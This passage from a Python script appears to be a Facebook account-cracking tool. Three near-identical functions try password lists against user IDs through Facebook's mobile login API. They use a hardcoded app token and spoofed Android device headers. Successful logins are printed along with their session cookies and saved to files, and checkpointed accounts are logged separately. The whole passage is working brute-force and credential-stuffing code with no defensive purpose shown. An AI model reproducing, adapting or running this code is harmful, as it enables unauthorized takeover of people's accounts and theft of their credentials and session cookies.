                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}Xen-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/Xen-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}Xen-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Xen-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}Xen-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/210.0.0.25.119;FBBV/143124725;FBDM/{density=2'+'.0,width='+'720,height='+'1280};FBLC/en_GB;FBRV/144993902;FBCR/Nepal Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T255S;FBSV/4.0.3;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'samsung',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '210.0.0.25.119',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}Xen-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/Xen-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}Xen-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Xen-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}HATS-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,300)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022716;FBDM/{density=3'+'.0,width='+'1080,height='+'2340};FBLC/en_NP;FBRV/35934039;FBCR/Smartfren;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M1903F11I;FBSV/9;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'Xiaomi',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '86.0.0.19.69',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}Xen-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/Xen-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}Xen-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Xen-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| END |__________________#
if __name__ == '__main__':

    menu()
